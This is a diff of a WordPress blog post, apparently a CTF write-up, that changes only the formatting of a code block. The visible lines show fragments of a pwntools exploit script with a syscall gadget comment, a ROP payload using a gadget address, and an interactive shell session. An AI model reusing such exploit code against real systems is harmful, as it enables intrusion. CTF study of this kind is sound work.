@@ -102,7 +102,8 @@ categories: [Sin categoría]
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+```python
+from pwn import *
 
 #0x4000c5 syscall
 #offset 2 24
@@ -180,5 +181,5 @@ payload2 += p64(0x0000000000400131)#sub rsp 100
 r.sendline(payload2)
 
 r.interactive()
-</code></pre>
+```
 <!-- /wp:code -->
